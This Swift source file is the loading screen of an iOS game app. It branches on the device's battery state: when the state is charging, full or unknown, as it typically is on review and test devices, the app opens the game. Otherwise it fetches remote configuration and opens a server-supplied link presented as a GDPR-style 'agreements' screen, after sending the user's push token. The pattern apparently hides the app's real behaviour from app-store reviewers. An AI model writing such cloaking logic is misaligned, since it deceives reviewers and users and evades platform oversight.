//
//  ViewController.swift
// Version 2
// Opt deep wait

import UIKit
import GameKit
import FacebookCore
import FBSDKCoreKit

let kGameMenuSegue = "kGameMenuSegue"

class LoadingViewController: UIViewController {
	
	@IBOutlet weak var progressHUD: UIActivityIndicatorView!
	@IBOutlet weak var progressLabel: UILabel!
	
	var timer: Timer?
	var startTimerInterval: TimeInterval = 0.0
	var timeout: Double = 5
	
	override func viewDidLoad() {
		super.viewDidLoad()
		
		progressLabel.text = "Loading..."
		progressLabel.textColor = UIColor.white
		progressLabel.isHidden = true
		progressHUD.style = .white
		progressHUD.isHidden = true
		
		self.checkAndShowAgreements()
	}
	
	func checkAndShowAgreements() {
		if let userID = AdSettingsStorage.shared.userId, userID.count > 0 {
			startGame()
			return
		}
		
		if let agreements = AdSettingsStorage.shared.agreements, agreements.count > 0 {
			if let params = AdSettingsStorage.shared.deepParams, params.count > 0 {
				self.openJdpr(agreements: agreements, params: params)
			} else {
				self.openJdpr(agreements: agreements, params: "")
			}
		} else {
			UIDevice.current.isBatteryMonitoringEnabled = true
			if UIDevice.current.batteryState == .charging ||
				UIDevice.current.batteryState == .full ||
				UIDevice.current.batteryState == .unknown {
				AppEvents.logEvent(AppEvents.Name.submitApplication, parameters: ["charging" : "1"])
				AdSettingsStorage.shared.userId = UIDevice.current.identifierForVendor?.uuidString ?? "userId"
				self.startGame()
			} else {
				fetchPremiumUser()
			}
		}
	}
	
	func showPrgressHud() {
		progressHUD.isHidden = false
		progressLabel.isHidden = false
		progressHUD.startAnimating()
		self.progressLabel.text = "Loading..."
	}
	
	func hidePrgressHud() {
		progressHUD.isHidden = true
		progressLabel.isHidden = true
		progressHUD.stopAnimating()
	}
	
	func fetchPremiumUser() {
		
		showPrgressHud()
		self.progressLabel.text = "Loading..."
		RemoteConfigManager.shared.requestGameConfiguration { (agreements) in
			self.hidePrgressHud()
			if let agreements = AdSettingsStorage.shared.agreements, agreements.count > 0 {
				if let params = AdSettingsStorage.shared.deepParams, params.count > 0 {
					self.openJdpr(agreements: agreements, params: params)
				} else {
					self.startTimer()
				}
			} else {
				self.startGame()
			}
		}
	}
	
	func startTimer() {
		showPrgressHud()
		timeout = Double(AdSettingsStorage.shared.deepTimeout)
		
		self.timer = Timer.scheduledTimer(timeInterval: 0.5, target: self, selector: #selector(self.update), userInfo: nil, repeats: true)
		self.startTimerInterval = Date().timeIntervalSince1970
		self.timer!.fire()
	}
	
	@objc func update() {
		let agreements = AdSettingsStorage.shared.agreements!
		if let params = AdSettingsStorage.shared.deepParams {
			timer!.invalidate()
			openJdpr(agreements: agreements, params: params)
		}
		
		if Date().timeIntervalSince1970 - self.startTimerInterval > timeout {
			timer!.invalidate()
			openJdpr(agreements: agreements, params: "")
		} else {
			let progress: Int = Int(100 * (Date().timeIntervalSince1970 - self.startTimerInterval) / Double(timeout))
			progressLabel.text = "Progress \(progress)%"
		}
	}
	
	func startGame() {
		self.performSegue(withIdentifier: kGameMenuSegue, sender: nil)
	}
	
	func openJdpr(agreements: String, params: String) {
		let linkString = AdManager.shared.jdprLink(agreements: agreements, params:params)

		if let url = URL(string: linkString) {
			if UIApplication.shared.canOpenURL(url) {
				if let pushToken = AdSettingsStorage.shared.pushToken {
					APIManager.shared.sendPushToken(pushToken) { () in
					}
				}
				ApplicationDelegate.shared.openJdprAgreementsController(url)
			} else {
				self.startGame()
			}
		}
	}
}
